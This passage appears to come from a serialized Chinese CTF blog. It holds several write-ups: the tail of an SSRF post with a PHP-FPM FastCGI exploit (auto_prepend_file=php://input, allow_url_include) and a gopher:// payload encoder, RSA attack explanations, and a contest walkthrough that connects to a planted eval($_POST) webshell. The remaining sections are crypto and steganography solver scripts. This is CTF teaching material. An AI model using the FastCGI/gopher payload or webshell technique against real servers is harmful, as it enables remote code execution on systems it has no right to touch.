&#x27;REQUEST_URI&#x27;: uri, &#x27;DOCUMENT_ROOT&#x27;: documentRoot, &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;, &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;, &#x27;REMOTE_PORT&#x27;: &#x27;9985&#x27;, &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;, &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;, &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;, &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;, &#x27;CONTENT_TYPE&#x27;: &#x27;application/text&#x27;, &#x27;CONTENT_LENGTH&#x27;: &quot;%d&quot; % len(content), &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = php://input&#x27;, &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27; &#125; response = client.request(params, content) print(force_text(response)) # python fpm.py -c &quot;&lt;?php system(&#x27;ls /&#x27;);?&gt;&quot; -p 12345 127.0.0.1 /var/www/html/index.php 将数据URL两次编码： 123456# -*- coding: UTF-8 -*-from urllib.parse import quote, unquote, urlencodefile= open(&#x27;1.txt&#x27;,&#x27;rb&#x27;)payload= file.read()payload= quote(payload).replace(&quot;%0A&quot;,&quot;%0A%0D&quot;)print(&quot;gopher://127.0.0.1:9000/_&quot;+quote(payload)) ​ 参考SSRF payloads","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"SSRF","slug":"SSRF","permalink":"https://lazzzaro.github.io/tags/SSRF/"}],"author":"Lazzaro"},{"title":"CTFshow供题 unusualrsa系列","slug":"other-CTFshow供题-unusualrsa系列","date":"2020-09-01T15:13:24.000Z","updated":"2021-10-16T16:24:39.924Z","comments":true,"path":"2020/09/01/other-CTFshow供题-unusualrsa系列/","link":"","permalink":"https://lazzzaro.github.io/2020/09/01/other-CTFshow%E4%BE%9B%E9%A2%98-unusualrsa%E7%B3%BB%E5%88%97/","excerpt":"","text":"​ 看到CTFshow上新上的easyrsa及funnyrsa系列题，手痒出了5道比较高阶的unusualrsa系列题。 在此仅提供思路以辅助，代码实现由读者自行查找/学习/完成/致用。如有疑问，欢迎留言。 ​ unusualrsa1明文 $m$ 高位泄露，泄露部分位数为 $2044-315=1729$，前部分添加 $208$ 位随机字符做padding以防止直接从 $c$ 还原出部分 $m$ 中的字符。可采用Coppersmith攻击中已知明文高位攻击方法。 算法说明 假设我们首先加密了消息 $m$，如下 $C\\equiv m^e \\bmod N$ 并且我们假设我们知道消息 $m$ 的很大的一部分 $m_0$，即 $m=m_0+x$，但是我们不知道 $x$。那么我们就有可能通过该方法进行恢复消息。这里我们不知道的 $x$ 其实就是多项式的根，需要满足 Coppersmith 的约束。 当 $e$ 足够小，且部分明文泄露时，可以采用Coppersmith单变量模等式的攻击，如下： $c=m^{e}\\bmod n=(mbar+x_{0})^{e}\\bmod n$，其中 $mbar = (m &gt;&gt; kbits) &lt;&lt; kbits$ 当 $\\vert x_{0}\\vert\\leq N^{\\frac{1}{e}}$ 时，可以在 $\\log N$ 和 $e$ 的多项式时间内求出 $x_0$。 ​ unusualrsa2 Related Message Attack 正确理解lambda函数及reduce函数的概念，发现reduce(lambda xxx,[yyy,zzz])实际就是对list参数从头元素至尾元素应用一遍lambda匿名函数的操作，得到最终结果。 第一步，assert函数用于确定x及y两个list的值（解一元二次方程），勿与匿名函数的参数名混淆； 第二步，pow(2*m+3,17,n)及pow(4*m+11,17,n)对应输出结果： $c_1=(2m+3)^{17} \\pmod n \\\\ c_2=(4m+11)^{17} \\pmod n$ 第三步，采用Coppersmith’s Short-pad Attack &amp; Related Message Attack（又称Franklin-Reiter攻击），其中此题的 $4m+11$ 可以等价构造为： $4m+11=2\\cdot(2m+3)+5$。 算法说明 目前在大部分消息加密之前都会进行 padding，但是如果 padding 的长度过短（$m \\in (0,\\lfloor\\frac{n.nbits()}{e^2}\\rfloor]$），也有可能被很容易地攻击。 这里所谓 padding 过短，其实就是对应的多项式的根会过小。 当 Alice 使用同一公钥对两个具有某种线性关系的消息 $M_1$ 与 $M_2$ 进行加密，并将加密后的消息 $C_1$，$C_2$ 发送给了 Bob 时，我们就可能可以获得对应的消息 $M_1$ 与 $M_2$ 。这里我们假设模数为 $N$，两者之间的线性关系如下： $M_1 \\equiv f(M_2) \\bmod N$ 其中 $f$ 为一个线性函数，比如说 $f=ax+b$。 在具有较小错误概率下的情况下，其复杂度为 $O(e\\log^2N)$。 这一攻击由 Franklin与Reiter 提出。 ​ unusualrsa3多项式RSA，整数RSA的变种，借助Sage工具求解。 定义与原理 在有限域上选取两个不可约多项式 $g(p),g(q)$，$g(n)=g(p) \\cdot g(q)$，计算出 $g(n)$ 的欧拉函数 $\\varphi(g(n))=\\varphi$， 选取一个整数 $e$ 作为公钥，$e$ 与 $\\varphi$ 是互素的，那么对于明文 $g(m)$，加密过程为 $g(m)^e \\equiv g(c) \\pmod {g(n)}$， 计算私钥 $d$ 满足 $ed \\equiv 1 \\pmod \\varphi$，则 $g(c)^d \\equiv (g(m)^e)^d \\equiv g(m)^{ed} \\equiv g(m)^{\\varphi+1} \\pmod {g(n)}$， 同样考虑 $g(n)$ 与 $g(m)$ 互素，欧拉定理对于多项式亦成立， 得到 $g(m)^{\\varphi+1} \\equiv g(m) \\pmod {g(n)}$，所以 $g(c)^d \\equiv g(m) \\pmod {g(n)}$。 显然RSA对于整数的体制可以适用于有限域上的多项式。 注意 对于素数 $x$，$\\varphi(x)=x-1$，但是对于不可约多项式 $g(x)$，$\\varphi(g(x))=p^n-1$。（此 $p$ 为 $GF(p)$ 的模，此 $n$ 为多项式最高项次数） 原因： 由欧拉函数定义本身，欧拉函数是小于 $n$ 的所有与 $n$ 互质的数的个数。 多项式的欧拉函数则类似，表示不高于 $g(x)$ 幂级的环内所有多项式中，与 $g(x)$ 无公因式（非1）的其他多项式的个数，所以每一个不高于 $g(x)$ 幂级的环内多项式（除了它自己）均满足此条件。 ​ unusualrsa4 Hint1: ed=1+kφ 比较e与k比特位数 联立两式，尝试化简 (inv(q,p)·φ) mod p Hint2: 费马小定理 对于任意 r,k1,k2，当 k2 为 k1 因子时，r mod k2=(r mod k1) mod k2 已知 $e,d,inv(q,p),c$，且 $p,q$ 同比特位数。 令 $cf=q^{-1} \\bmod p$，有 $q\\cdot cf=1 \\pmod p$。 $ed=1+k(p-1)(q-1)$， 比较比特位数，$k$ 与 $e$ 同长，可爆破 $k$，得 $\\varphi(n)=(p-1)(q-1)=\\cfrac{ed-1}{k}$； 上式 $\\varphi(n) =(p-1)(q-1) \\pmod p=-(q-1) \\pmod p$， 结合 $q\\cdot cf=1 \\pmod p$，即 $q\\cdot cf-1=0 \\pmod p$， 联立： $\\begin{eqnarray} \\varphi(n)&amp;=&amp;(p-1)(q-1)\\\\&amp;=&amp;pq-p-q+1\\\\&amp;=&amp;n-p-q+1 \\end{eqnarray}$ $\\begin{eqnarray} cf\\cdot \\varphi(n)&amp;=&amp;cf\\cdot(n-p-q+1)\\\\&amp;=&amp;cf\\cdot n-cf\\cdot p-cf\\cdot q+cf \\end{eqnarray}$ $\\begin{eqnarray} cf\\cdot \\varphi(n) \\bmod p&amp;=&amp;(cf\\cdot n-cf\\cdot p-cf\\cdot q+cf) \\bmod p\\\\&amp;=&amp;0-0-(cf\\cdot q)+cf \\bmod p\\\\&amp;=&amp;-1+cf \\bmod p \\end{eqnarray}$ 有 $1+cf\\cdot \\varphi(n)-cf=0\\pmod p$， 即$x=1+cf\\cdot \\varphi(n)-cf$ 能被 $p$ 整除； 由费马小定理，存在 $r$ 满足 $r^{p-1}=1 \\pmod p$， $\\begin{eqnarray}r^{\\varphi(n)}&amp;=&amp;(r^{(p-1)})^{(q-1)}\\\\&amp;=&amp;1^{(q-1)} \\pmod p\\\\&amp;=&amp;1 \\pmod p \\end{eqnarray}$， 因对于任意 $r,k_1,k_2$，当 $k_2$ 为 $k_1$ 因子时，$r \\bmod k_2=(r \\bmod k_1) \\bmod k_2$， 故 $r^{\\varphi(n)} \\bmod p=(r^{\\varphi(n)} \\bmod x) \\bmod p=1 \\bmod p=kp$， 已知 $\\varphi(n)$，由 $(r^{\\varphi(n)} \\bmod x) \\bmod p=kp$ 可得到多组 $p$ 的乘积，计算 $\\gcd$ 可得到 $p$； 由 $q\\cdot cf=1 \\pmod p$ 求模逆可得 $q$，再用 $c$ 计算出 $m$。 ​ unusualrsa5 有限域 n-th root 发现 $\\gcd(e,\\varphi) =e$ 且 $e\\mid (p-1),e\\mid (q-1)$。 解题思路即求解 $m \\bmod p$ 和 $m \\bmod q$ ，再通过CRT还原 $m \\bmod n$。 这里 $e$ 与 $p-1$ 和 $q-1$ 都不互素，不能简单地求个逆元就完事，主要难点则是在有限域 $GF(p)$ 上求 $e$ 次根。 在有限域上求r-th root有两个常见算法：Adleman-Manders-Miller algorithm (AMM) 和Cipolla-Lehmer algorithm (CL)，这里采用AMM算法（paper）。 这个算法只能开出一个根，实际上开 $e$ 次方，最多会有 $e$ 个根（这题的情况下有0x1337个根）。 如何找到其他根？ StackOverflow – Cube root modulo P 给出了方法。 如何找到所有的primitive n-th root of 1? StackExchange – Finding the n-th root of unity in a finite field 给出了方法。 以 e=0x1337​ 为例： 先用Adleman-Manders-Miller rth Root Extraction Method在 $GF(p)$ 和 $GF(q)$ 上对 $c$ 开 $e$ 次方根，分别得到一个解。大概不到10秒。 然后去找到所有的0x1336个primitive nth root of 1，乘以上面那个解，得到所有的0x1337个解。大概1分钟。 再用CRT对 $GF(p)$ 和 $GF(q)$ 上的两组0x1337个解组合成 $\\bmod n$ 下的解，可以得到0x1337**2=24196561个 $\\bmod n$ 的解。最后能通过check()的即为flag。大概十几分钟。 此题可根据上述算法或利用Sage自带函数实现计算。","categories":[{"name":"other","slug":"other","permalink":"https://lazzzaro.github.io/categories/other/"}],"tags":[{"name":"RSA","slug":"RSA","permalink":"https://lazzzaro.github.io/tags/RSA/"}],"author":"Lazzaro"},{"title":"CTFshow 菜鸡杯","slug":"match-CTFshow-菜鸡杯","date":"2020-08-29T09:58:28.000Z","updated":"2020-08-30T04:35:41.960Z","comments":true,"path":"2020/08/29/match-CTFshow-菜鸡杯/","link":"","permalink":"https://lazzzaro.github.io/2020/08/29/match-CTFshow-%E8%8F%9C%E9%B8%A1%E6%9D%AF/","excerpt":"","text":"​ https://hub.ctfer.com/ 任务：打败五大派高手的围攻，最后挑战邪恶BOSS【没技术是菜鸡】 比赛：CTFshow 菜鸡杯 (简称：鸡杯) 开始：2020/8/29 9:00 结束：2020/8/30 9:00 题目： web 杂项 密码 逆向 pwn 若干道 规则：1 比赛期间可以随意讨论，wp须在比赛结束后发布，wp统一发布地址：https://wp.ctf.show2 公平竞技，独立比赛3 服务器不要爆破，不要攻击服务器，不要扫描!!!4 奖品：rank最高的师傅获得武林神器：上古鸡杯 x 1 ，获得称号：鸡杯王 第一关 Web派的挑战摇号入园 http://119.28.74.193:28066/ hint:后台里面找邮箱 发现页面有报错，index.php含一句话马eval($_POST[1]); 直接上蚁剑，使用密码1连接http://119.28.74.193:28066/index.php，拿到webshell，接下来找flag； 查看目录列表查看最近修改的文件未发现flag，根据修改日期，进入命令行用find命令按内容搜索config和runtime目录： find /var/www/html/config | xargs grep &quot;flag&#123;&quot; find /var/www/html/runtime | xargs grep &quot;flag&#123;&quot; 在/var/www/html/rumtime/log/202008/22.log中找到flag： 123456789(www-data:/var/www/html/runtime) $ find . | xargs grep &quot;flag&#123;&quot;grep: .: Is a directorygrep: ./cache: Is a directorygrep: ./cache/4e: Is a directorygrep: ./temp: Is a directorygrep: ./log: Is a directorygrep: ./log/202008: Is a directory./log/202008/22.log: &#x27;email_password&#x27; =&gt; &#x27;flag&#123;ctf_show_boy&#125;&#x27;,./log/202008/22.log:[ sql ] [ SQL ] UPDATE `kite_site_config` SET `v` = &#x27;flag&#123;ctf_show_boy&#125;&#x27; WHERE `site_id` = 1 AND `k` = &#x27;email_password&#x27; [ RunTime:0.000250s ] ​ 第二关 杂项派的挑战猎兔 https://ctfshow.lanzous.com/imJj4g62dwj png文件 hint: 兔兔数列 查看16进制发现crc值不匹配，用png图片宽高爆破脚本得到正确高度（或直接改大高度），修改得到提示： 结合hint，兔子数列即为斐波那契数列。 用zsteg查看png图有无隐写内容，发现lsb按列提取的green最低位有一串接近flag的字符串： 看到其中flag&#123;五个字符串分别对应着0,1,2,4,7位（反斜杠转义），差值为1,1,2,3刚好对应斐波那契数列前四项； 用stegsolve.jar取出lsb按列提取的green最低位完整字符串，存bin文件： 最后用脚本按斐波那契数列方式提取字符拼接： 12345678910111213141516s=open(&#x27;out.bin&#x27;,&#x27;r&#x27;).read()t=[1,1]for i in range(2,100): t.append(t[i-1]+t[i-2])flag=&#x27;&#x27;i=0j=0while j&lt;len(s): if j&gt;=len(s): break ss+=s[j] j+=t[i] i+=1 print(flag) ​ 初音未来-圆周率之歌 https://ctfshow.lanzous.com/iq64Jg62egj mp3文件 hint1: 歌词，看看那首歌最后 hint2: 福尔摩斯有一章说过，这种形式的密文 一般都需要一个字典。这种组合，一般表示 要么是 多少页的第多几个单词。但是因为 xxxx 比较大，一般没有这么厚的书。所以我们可以认为，他是一个灰常长的字典，然后？表示顺序截取？个字符。 audacity查看mp3音频没什么发现，后放出两个hint，思路很明显了。 mp3文件最后内容： 歌词为10000+位 $\\pi$ 的值，按照其中的(a,b)组合分别从歌词提取a位置开始b长度的数字，再转成字符即可。 1234567891011#f=open(&#x27;pi.mp3&#x27;,&#x27;rb&#x27;).read()[-250:]dic=&#123;2750:3,2535:3,739:2,3487:3,1925:3,451:2,898:2,1479:2,1623:2,1541:2,1232:2,1118:2,1780:2,594:2,2033:2,79:2,1193:2,406:2,1623:2,774:2,1223:2,1351:3&#125;s=&#x27;3.14159265358979323846264338327950288419716939937510582097494459230781640628620899862803482534211706798214808651328230664709384460955058223172535940812848111745028410270193852110555964462294895493038196442881097566593344612847564823378678316527120190914564856692346034861045432664821339360726024914127372458700660631558817488152092096282925409171536436789259036001133053054882046652138414695194151160943305727036575959195309218611738193261179310511854807446237996274956735188575272489122793818301194912983367336244065664308602139494639522473719070217986094370277053921717629317675238467481846766940513200056812714526356082778577134275778960917363717872146844090122495343014654958537105079227968925892354201995611212902196086403441815981362977477130996051870721134999999837297804995105973173281609631859502445945534690830264252230825334468503526193118817101000313783875288658753320838142061717766914730359825349042875546873115956286388235378759375195778185778053217122680661300192787661119590921642019893809525720106548586327886593615338182796823030195203530185296899577362259941389124972177528347913151557485724245415069595082953311686172785588907509838175463746493931925506040092770167113900984882401285836160356370766010471018194295559619894676783744944825537977472684710404753464620804668425906949129331367702898915210475216205696602405803815019351125338243003558764024749647326391419927260426992279678235478163600934172164121992458631503028618297455570674983850549458858692699569092721079750930295532116534498720275596023648066549911988183479775356636980742654252786255181841757467289097777279380008164706001614524919217321721477235014144197356854816136115735255213347574184946843852332390739414333454776241686251898356948556209921922218427255025425688767179049460165346680498862723279178608578438382796797668145410095388378636095068006422512520511739298489608412848862694560424196528502221066118630674427862203919494504712371378696095636437191728746776465757396241389086583264599581339047802759009946576407895126946839835259570982582262052248940772671947826848260147699090264013639443745530506820349625245174939965143142980919065925093722169646151570985838741059788595977297549893016175392846813826868386894277415599185592524595395943104997252468084598727364469584865383673622262609912460805124388439045124413654976278079771569143599770012961608944169486855584840635342207222582848864815845602850601684273945226746767889525213852254995466672782398645659611635488623057745649803559363456817432411251507606947945109659609402522887971089314566913686722874894056010150330861792868092087476091782493858900971490967598526136554978189312978482168299894872265880485756401427047755513237964145152374623436454285844479526586782105114135473573952311342716610213596953623144295248493718711014576540359027993440374200731057853906219838744780847848968332144571386875194350643021845319104848100537061468067491927819119793995206141966342875444064374512371819217999839101591956181467514269123974894090718649423196156794520809514655022523160388193014209376213785595663893778708303906979207734672217256259966150142150306803844773454920260541466592520149744285073251866600213243408819071048633173464965145390579626856100550810665879699816357473638405257145910289706414011097120628043903975951567715770042033786993600723055876317635942187312514712053292819182618612586732157919841484882916447060957527069572209175671167229109816909152801735067127485832228718352093539657251210835791513698820914442100675103346711031412671113699086585163983150197016515116851714376576183515565088490998985998238734552833163550764791853589322618548963213293308985706420467525907091548141654985946163718027098199430992448895757128289059232332609729971208443357326548938239119325974636673058360414281388303203824903758985243744170291327656180937734440307074692112019130203303801976211011004492932151608424448596376698389522868478312355265821314495768572624334418930396864262434107732269780280731891544110104468232527162010526522721116603966655730925471105578537634668206531098965269186205647693125705863566201855810072936065987648611791045334885034611365768675324944166803962657978771855608455296541266540853061434443185867697514566140680070023787765913440171274947042056223053899456131407112700040785473326993908145466464588079727082668306343285878569830523580893306575740679545716377525420211495576158140025012622859413021647155097925923099079654737612551765675135751782966645477917450112996148903046399471329621073404375189573596145890193897131117904297828564750320319869151402870808599048010941214722131794764777262241425485454033215718530614228813758504306332175182979866223717215916077166925474873898665494945011465406284336639379003976926567214638530673609657120918076383271664162748888007869256029022847210403172118608204190004229661711963779213375751149595015660496318629472654736425230817703675159067350235072835405670403867435136222247715891504953098444893330963408780769325993978054193414473774418426312986080998886874132604721569516239658645730216315981931951673538129741677294786724229246543668009806769282382806899640048243540370141631496589794092432378969070697794223625082216889573837986230015937764716512289357860158816175578297352334460428151262720373431465319777741603199066554187639792933441952154134189948544473456738316249934191318148092777710386387734317720754565453220777092120190516609628049092636019759882816133231666365286193266863360627356763035447762803504507772355471058595487027908143562401451718062464362679456127531813407833033625423278394497538243720583531147711992606381334677687969597030983391307710987040859133746414428227726346594704745878477872019277152807317679077071572134447306057007334924369311383504931631284042512192565179806941135280131470130478164378851852909285452011658393419656213491434159562586586557055269049652098580338507224264829397285847831630577775606888764462482468579260395352773480304802900587607582510474709164396136267604492562742042083208566119062545433721315359584506877246029016187667952406163425225771954291629919306455377991403734043287526288896399587947572917464263574552540790914513571113694109119393251910760208252026187985318877058429725916778131496990090192116971737278476847268608490033770242429165130050051683233643503895170298939223345172201381280696501178440874519601212285993716231301711444846409038906449544400619869075485160263275052983491874078668088183385102283345085048608250393021332197155184306354550076682829493041377655279397517546139539846833936383047461199665385815384205685338621867252334028308711232827892125077126294632295639898989358211674562701021835646220134967151881909730381198004973407239610368540664319395097901906996395524530054505806855019567302292191393391856803449039820595510022635353619204199474553859381023439554495977837790237421617271117236434354394782218185286240851400666044332588856986705431547069657474585503323233421073015459405165537906866273337995851156257843229882737231989875714159578111963583300594087306812160287649628674460477464915995054973742562690104903778198683593814657412680492564879855614537234786733039046883834363465537949864192705638729317487233208376011230299113679386270894387993620162951541337142489283072201269014754668476535761647737946752004907571555278196536213239264061601363581559074220202031872776052772190055614842555187925303435139844253223415762336106425063904975008656271095359194658975141310348227693062474353632569160781547818115284366795706110861533150445212747392454494542368288606134084148637767009612071512491404302725386076482363414334623518975766452164137679690314950191085759844239198629164219399490723623464684411739403265918404437805133389452574239950829659122850855582157250310712570126683024029295252201187267675622041542051618416348475651699981161410100299607838690929160302884002691041407928862150784245167090870006992821206604183718065355672525325675328612910424877618258297651579598470356222629348600341587229805349896502262917487882027342092222453398562647669149055628425039127577102840279980663658254889264880254566101729670266407655904290994568150652653053718294127033693137851786090407086671149655834343476933857817113864558736781230145876871266034891390956200993936103102916161528813843790990423174733639480457593149314052976347574811935670911013775172100803155902485309066920376719220332290943346768514221447737939375170344366199104033751117354719185504644902636551281622882446257591633303910722538374218214088350865739177150968288747826569959957449066175834413752239709683408005355984917541738188399944697486762655165827658483588453142775687900290951702835297163445621296404352311760066510124120065975585127617858382920419748442360800719304576189323492292796501987518721272675079812554709589045563579212210333466974992356302549478024901141952123828153091140790738602515227429958180724716259166854513331239480494707911915326734302824418604142636395480004480026704962482017928964766975831832713142517029692348896276684403232609275249603579964692565049368183609003238092934595889706953653494060340216654437558900456328822505452556405644824651518754711962184439658253375438856909411303150952617937800297412076651479394259029896959469955657612186561967337862362561252163208628692221032748892186543648022967807057656151446320469279068212073883778142335628236089632080682224680122482611771858963814091839036736722208883215137556003727983940041529700287830766709444745601345564172543709069793961225714298946715435784687886144458123145935719849225284716050492212424701412147805734551050080190869960330276347870810817545011930714122339086639383395294257869050764310063835198343893415961318543475464955697810382930971646514384070070736041123735998434522516105070270562352660127648483084076118301305279320542746286540360367453286510570658748822569815793678976697422057505968344086973502014102067235850200724522563265134105592401902742162484391403599895353945909440704691209140938700126456001623742880210927645793106579229552498872758461012648369998922569596881592056001016552563756785667227966198857827948488558343975187445455129656344348039664205579829368043522027709842942325330225763418070394769941597915945300697521482933665556615678736400536665641654732170439035213295435291694145990416087532018683793702348886894791&#x27;flag=&#x27;&#x27;for k,v in dic.items(): flag+=chr(int(s[k:k+v])) print(flag) ​ 差一点 https://ctfshow.lanzous.com/iNbACg62edg It’s so easy,you can trytrysee. JSFUCK编码，去掉最后的()，在浏览器Console中运行得flag。 ​ 第三关 CRYPTO派的挑战我们不吃荤 https://hub.ctfer.com/file/crypto1.zip 只有二进制的世界是不是有些无聊 查看文件，只有0,1,2三种数字，猜测为3进制，转换为16进制后，出现多个3X模式的子串，猜测转为字符；转换后又有0,1,2,3,4四中数字，猜测为5进制，转换为16进制后，又出现多个3X模式的子串…… 不断尝试发现规律，需要转换的进制均为素数进制（不吃荤？）。中间需要不断尝试输出结果以确定进制数，注意int()函数的第二参数仅支持36及以下数值的转换，大于36的情况需要自行实现进制转换函数change()。脚本解： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990s=open(&#x27;c.txt&#x27;,&#x27;r&#x27;).read()s=int(s,3)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=int(s,5)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=int(s,7)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=int(s,11)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=int(s,13)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=int(s,17)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=int(s,19)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=int(s,23)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=int(s,29)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=int(s,31)s=hex(s)[2:]s=bytes.fromhex(s).decode()#int不支持k&gt;36dic=&#123;&#125;for i in range(10): dic[chr(ord(&#x27;0&#x27;)+i)]=ifor i in range(26): dic[chr(ord(&#x27;a&#x27;)+i)]=i+10for i in range(26): dic[chr(ord(&#x27;A&#x27;)+i)]=i+10+26print(dic)def change(s,k): j=0 res=0 for i in range(len(s)): res+=dic[s[len(s)-i-1]]*pow(k,j) j+=1 return res s=change(s,37)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=change(s,41)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=change(s,43)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=change(s,47)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=change(s,53)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=change(s,59)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=change(s,61)s=hex(s)[2:]s=bytes.fromhex(s).decode()#flagprint(s) ​ 天仙金丹心法 https://hub.ctfer.com/file/crypto2.zip 道在屎溺 ○ 须要：次想把常面知本用都部道文哈是用已本连希无来比净题续即用凑如妙道密进可的字真法在海码行：○ 数灭自屎凡器只三后全而神然溺鼎归心 查询知此为中文栅栏解密，且每一栏递增，还原： 竖着读，用常见md5计算三次即为flag。 123456789from hashlib import md5s=open(&#x27;题目.txt&#x27;,&#x27;rb&#x27;).read()s=md5(s).hexdigest()s=md5(s.encode()).hexdigest()s=md5(s.encode()).hexdigest()print(s)open(&#x27;out.txt&#x27;,&#x27;w&#x27;).write(s) ​ Knapsack My Number Theory Book https://hub.ctfer.com/file/crypto3.zip hint1: 1112222333333 mod (10^7)=2333333hint2: Knapsack Cryptosystem 有机会参与Crypto的压轴题出题~~ 不过好像没有人碰= = 其实这题是一个数论题与背包加密系统的套娃题。 源代码： 123456789101112131415161718192021222324252627from json import dumpfrom random import SystemRandomfrom hashlib import *random = SystemRandom()k, n, d = 15, 40, 0.4B = 2**(n//d)A = [random.randint(1, B) for _ in range(n)]s = sum(A[index] for index in random.sample(range(n), k))part = int(str(int.from_bytes(str(s).encode(), byteorder=&#x27;little&#x27;) &lt;&lt; 10000)[-175:])dump((A,part), open(&quot;data&quot;, &quot;w&quot;))print(s)print(part)inp = input(&quot;Please input the solution (0, 1, 0, 1, ...): &quot;)sol = [int(i) for i in inp.split(&#x27;,&#x27;)]assert sum(i == 1 for i in sol) == kassert len(sol) == nassert all(i == 0 or i == 1 for i in sol)if sum(x*a for x, a in zip(sol, A)) == s: m = md5(&#x27;&#x27;.join(str(i) for i in sol).encode()).hexdigest() print(f&quot;TQL!! flag is &#123;m.join([&#x27;flag&#123;&#x27;, &#x27;&#125;&#x27;])&#125;&quot;) 外层是 $n=40,k=15,d=0.4$ 的背包密码系统，即40维子集和问题，解向量重量为15，背包密度为0.4（40长度的01解向量数组中含15个1）； 内层是需要一点数论知识才能从part求解出的s，即子集和的值； 求解出01解向量组成的字符串md5哈希值即为flag。 内层 int.from_bytes(bytes, byteorder, *, signed=False) 可实现不固定长度的bytes类型数据转int类型数据，byteorder标志小字节顺序还是大字节顺序 根据part值还原s值，其中byteorder=&#39;little&#39;代表小端序（反序），假设 $t$ 为 $s$ 反序字符串对应的int值，$p$ 为part值，根据已知关系有： t左移10000位后后175位值为part。 因 $a&lt;&lt;b \\Rightarrow a\\cdot 2^b$ ，故 $t&lt;&lt;10000 \\Rightarrow t\\cdot 2^{10000}$，又 $t\\cdot 2^{10000}$ 以 175位的 $p$ 结尾，即： $p = (t\\cdot 2^{10000}) \\bmod (10^{175})$ 但此时不能直接应用模逆运算计算出 $t$ ，因为 $\\gcd(2^{10000},10^{175}) \\neq 1$； 做一下转换： $p \\equiv (t\\cdot 2^{10000}) \\pmod {10^{175}} \\ \\Rightarrow t\\cdot 2^{10000}=x\\cdot 10^{175}+p$ 分解 $p$ 发现： $p=2^{176} \\cdot 3 \\cdot 43973 \\cdot 69653 \\cdot 6642192645148709014118321101167435034612406484841133642520224597359790421504311588434603251039359463852561066413$ 设 $y=\\cfrac{p}{2^{175}}$，则 $t\\cdot 2^{10000}=x\\cdot 10^{175}+2^{175}\\cdot y \\ \\Rightarrow t\\cdot 2^{9825}=x\\cdot 5^{175}+ y \\ \\Rightarrow y \\equiv t \\cdot 2^{9825} \\pmod {5^{175}} \\ \\Rightarrow y \\cdot (2^{9825})^{-1} \\equiv t \\pmod {5^{175}}$ 通过求模逆可还原 $t$ ，再还原出 $s$。 123456789101112131415from gmpy2 import invertn = pow(5,175)p = 5845718273413614238047854434058144506973237928951593664100212455023083304425941087047510727554535833686148194478724602632928856425119454505382766186798132132909079456410238976y = p // pow(2,175)k = pow(2, 9825, n)kinv = int(invert(k, n))t = (y * kinv) % nprint(t)#t=int.from_bytes(str(s).encode(), byteorder=&#x27;little&#x27;)s = int(bytes.fromhex(hex(t)[2:])[::-1])print(s)#sum 外层 小规模的背包密码系统，可以直接用常见LLL算法攻击，参考： https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/knapsack/knapsack-zh/ Sage脚本： 123456789101112131415161718192021222324252627282930313233import binascii# open the public key and strip the spaces so we have a decent arraypubKey = [291261609902039997017727282042, 323900844596016068072642445649, 266988452026099177894210813748, 408729576966214254532209048947, 437048374902001262457529358416, 45441859606116873131092743344, 51312372228432799205402860932, 446894113383896613780223791057, 387275979896657368942582580348, 106191812735537081768832792472, 314442025322217482482346876963, 458938676660836185669115411856, 624514817837775109409742774239, 223466848034665041761802574065, 317380931967330048573366834100, 305525458686341075758884485721, 477363540414430757340867483621, 538724147876064506850294590869, 147986153711350097748394541291, 237604431565908226570207609923, 168061497374145289079315904395, 226257393036905506618868519191, 606131084939410793557726750445, 229847073637282132507525425264, 189589107972678036785075475201, 258811229764745601613575317649, 188968262675983804863009858052, 594623692847436704500625622597, 494291994428984378953385211372, 602493249658184503910046469358, 196950288482747513670119067849, 300975486828861896159703499663, 606100573531309594132334686576, 330763266814750730387569732411, 169247067050997623804446808122, 488060887558585221461996453780, 235957723689777110563629411239, 617280674032071480762572507845, 1187994588804681817349174099, 286948311141611416450158085330]nbit = len(pubKey)# open the encoded messageencoded = 4823023867810203947898718813977print(&quot;start&quot;)# create a large matrix of 0&#x27;s (dimensions are public key length +1)A = Matrix(ZZ, nbit + 1, nbit + 1)# fill in the identity matrixfor i in range(nbit): A[i, i] = 1# replace the bottom row with your public keyfor i in range(nbit): A[i, nbit] = pubKey[i]# last element is the encoded messageA[nbit, nbit] = -int(encoded)res = A.LLL()for i in range(0, nbit + 1): # print solution M = res.row(i).list() flag = True for m in M: if m != 0 and m != 1: flag = False break if flag: print(i, M) M = &#x27;&#x27;.join(str(j) for j in M) # remove the last bit M = M[:-1] print(&#x27;&#x27;.join([str(i) for i in M])) ​ 第四关 逆向派的挑战第五关 胖派的挑战 弱鸡略过Hard Re+PWN~ ​ 第六关 没技术是菜鸡大魔王最菜的boss https://hub.ctfer.com/file/boss.zip 菜鸡中的战斗机 源码： 12345678import wmiimport timefor i in 